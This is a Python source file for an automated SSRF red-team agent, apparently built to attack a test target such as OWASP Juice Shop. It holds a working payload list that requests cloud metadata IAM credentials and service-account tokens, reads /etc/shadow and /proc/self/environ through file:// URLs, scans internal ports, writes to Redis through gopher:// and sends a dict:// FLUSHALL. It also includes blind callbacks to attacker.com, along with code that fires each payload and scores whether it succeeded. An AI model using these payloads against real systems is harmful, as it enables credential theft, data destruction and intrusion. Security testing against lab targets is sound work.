from typing import List, Dict, Any, Optional
from datetime import datetime
from uuid import UUID
import structlog
import httpx
import random
import urllib.parse

from agents.schemas import EpisodeContext, RedTeamAction
from agents.rag.memory import RAGMemory

logger = structlog.get_logger(__name__)


SSRF_TECHNIQUES = [
    {
        "technique_id": "T1590.005",
        "name": "Basic SSRF",
        "owasp_category": "A10",
        "attack_type": "basic_ssrf",
        "endpoints": [
            "/api/fetch?url={payload}",
            "/api/webhook?url={payload}",
            "/api/import?source={payload}",
            "/api/preview?url={payload}",
            "/api/avatar?url={payload}",
        ],
        "payloads": [
            "http://localhost:8080/admin",
            "http://127.0.0.1:8080/actuator/health",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.azure.com/metadata/instance?api-version=2021-02-01",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "dict://localhost:11211/stats",
            "ldap://localhost:389/",
        ],
        "description": "Server-side request forgery to access internal resources",
    },
    {
        "technique_id": "T1590.005",
        "name": "Blind SSRF",
        "owasp_category": "A10",
        "attack_type": "blind_ssrf",
        "endpoints": [
            "/api/webhook?callback={payload}",
            "/api/submit?url={payload}",
            "/api/notify?endpoint={payload}",
        ],
        "payloads": [
            "http://attacker.com/log?ssrf=blind",
            "http://attacker.com:8080/",
            "dns://attacker.com",
        ],
        "description": "Blind SSRF using out-of-band detection",
    },
    {
        "technique_id": "T1590.005",
        "name": "Cloud Metadata Access",
        "owasp_category": "A10",
        "attack_type": "cloud_metadata",
        "endpoints": [
            "/api/fetch?url={payload}",
            "/api/preview?url={payload}",
        ],
        "payloads": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/iam/info",
            "http://169.254.169.254/latest/user-data",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.azure.com/metadata/instance?api-version=2021-02-01",
        ],
        "description": "Access cloud provider metadata endpoints",
    },
    {
        "technique_id": "T1590.005",
        "name": "Internal Port Scanning",
        "owasp_category": "A10",
        "attack_type": "internal_port_scan",
        "endpoints": [
            "/api/fetch?url={payload}",
        ],
        "payloads": [
            "http://localhost:22",
            "http://localhost:3306",
            "http://localhost:5432",
            "http://localhost:6379",
            "http://localhost:8080",
            "http://localhost:9200",
            "http://127.0.0.1:8080/admin",
            "http://127.0.0.1:9000",
        ],
        "description": "Scan internal ports via SSRF",
    },
    {
        "technique_id": "T1590.005",
        "name": "File Scheme Access",
        "owasp_category": "A10",
        "attack_type": "file_scheme",
        "endpoints": [
            "/api/fetch?url={payload}",
            "/api/import?source={payload}",
        ],
        "payloads": [
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///proc/version",
            "file:///etc/ssh/sshd_config",
            "file:///var/www/html/config.php",
            "phar:///var/www/html/upload/image.jpg",
        ],
        "description": "Access local files via file:// scheme",
    },
    {
        "technique_id": "T1590.005",
        "name": "Gopher/Redis SSRF",
        "owasp_category": "A10",
        "attack_type": "gopher_redis",
        "endpoints": [
            "/api/fetch?url={payload}",
        ],
        "payloads": [
            "gopher://127.0.0.1:6379/_*3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0Ax%0D%0A%2412%0D%0Ahacked_value%0D%0A",
            "dict://127.0.0.1:6379/FLUSHALL",
        ],
        "description": "Exploit Redis via SSRF using Gopher/Dict protocol",
    },
]


class SSRFRedTeamAgent:
    def __init__(
        self,
        rag_memory: Optional[RAGMemory] = None,
        scenario: str = "ssrf",
        target_type: str = "juice_shop",
    ):
        self.rag = rag_memory
        self.scenario = scenario
        self.target_type = target_type
        self.techniques = SSRF_TECHNIQUES
        self.technique_index = 0
        self.payload_index = 0
        self.client = httpx.AsyncClient(timeout=30.0, follow_redirects=True)

    async def select_action(self, state: EpisodeContext) -> Optional[RedTeamAction]:
        if self.technique_index >= len(self.techniques):
            logger.info("All SSRF techniques exhausted", episode_id=str(state.episode_id))
            return None

        technique = self.techniques[self.technique_index]

        if self.payload_index >= len(technique["payloads"]):
            self.technique_index += 1
            self.payload_index = 0
            return await self.select_action(state)

        payload = technique["payloads"][self.payload_index]
        self.payload_index += 1

        target_endpoint = self._select_endpoint(technique, state)
        full_url = self._build_ssrf_url(target_endpoint, payload, state)

        action = RedTeamAction(
            technique_id=technique["technique_id"],
            owasp_category=technique["owasp_category"],
            attack_type=technique["attack_type"],
            target_endpoint=full_url,
            http_method="GET",
            payload={"ssrf_payload": payload},
            headers={"Content-Type": "application/json"},
            expected_behavior=technique["description"],
        )

        return action

    def _select_endpoint(self, technique: Dict[str, Any], state: EpisodeContext) -> str:
        endpoints = technique.get("endpoints", ["/api/fetch?url=test"])
        endpoint = random.choice(endpoints)
        return f"{state.target_url.rstrip('/')}{endpoint}"

    def _build_ssrf_url(self, endpoint: str, payload: str, state: EpisodeContext) -> str:
        # Replace {payload} placeholder with encoded payload
        encoded_payload = urllib.parse.quote(payload, safe='')
        url = endpoint.replace("{payload}", encoded_payload)
        
        if not url.startswith("http"):
            url = f"{state.target_url.rstrip('/')}{url}"
        
        return url

    async def execute_action(self, action: RedTeamAction, target_url: str) -> Dict[str, Any]:
        try:
            full_url = action.target_endpoint
            if not full_url.startswith("http"):
                full_url = f"{target_url.rstrip('/')}{action.target_endpoint}"

            logger.info("Executing SSRF attack", url=full_url, technique=action.technique_id)

            response = await self.client.get(full_url, headers=action.headers, timeout=10.0)

            success = self._check_ssrf_success(response, action.attack_type)

            result = {
                "success": success,
                "status_code": response.status_code,
                "response_body": response.text[:2000] if response.text else "",
                "response_headers": dict(response.headers),
                "technique_id": action.technique_id,
                "attack_type": action.attack_type,
                "payload": action.payload.get("ssrf_payload", ""),
                "timestamp": datetime.utcnow().isoformat(),
            }

            if success:
                logger.info("SSRF successful", technique=action.technique_id, status=response.status_code)
            else:
                logger.info("SSRF failed", technique=action.technique_id, status=response.status_code)

            return result

        except httpx.TimeoutException:
            return {"success": False, "error": "Timeout", "technique_id": action.technique_id}
        except httpx.ConnectError:
            return {"success": False, "error": "Connection failed", "technique_id": action.technique_id}
        except Exception as e:
            logger.error("SSRF execution error", technique=action.technique_id, error=str(e))
            return {"success": False, "error": str(e), "technique_id": action.technique_id}

    def _check_ssrf_success(self, response: httpx.Response, attack_type: str) -> bool:
        if response.status_code >= 500:
            return True

        body = response.text.lower()

        if attack_type == "basic_ssrf":
            return any(kw in body for kw in [
                "internal", "private", "metadata", "169.254.169.254",
                "metadata.google", "metadata.azure", "iam/security-credentials",
                "user-data", "instance-id", "ami-id",
            ]) or response.status_code == 200

        elif attack_type == "cloud_metadata":
            return any(kw in body for kw in [
                "iam/security-credentials", "instance-id", "ami-id",
                "instance-type", "local-ipv4", "public-ipv4",
                "computeMetadata", "metadata.google", "metadata.azure",
            ])

        elif attack_type == "internal_port_scan":
            return response.status_code in [200, 401, 403, 500] and any(kw in body for kw in [
                "ssh", "mysql", "postgresql", "redis", "elasticsearch",
                "open", "listening", "port", "connection",
            ])

        elif attack_type == "file_scheme":
            return any(kw in body for kw in [
                "root:", "daemon:", "bin:", "sys:", "sync:",
                "[boot loader]", "password", "ssh", "host",
                "<?php", "database", "config",
            ])

        elif attack_type == "gopher_redis":
            return response.status_code in [200, 500] and any(kw in body for kw in [
                "redis", "flushall", "ok", "error",
            ])

        elif attack_type == "blind_ssrf":
            return response.status_code in [200, 202, 204]

        return False

    async def close(self):
        await self.client.aclose()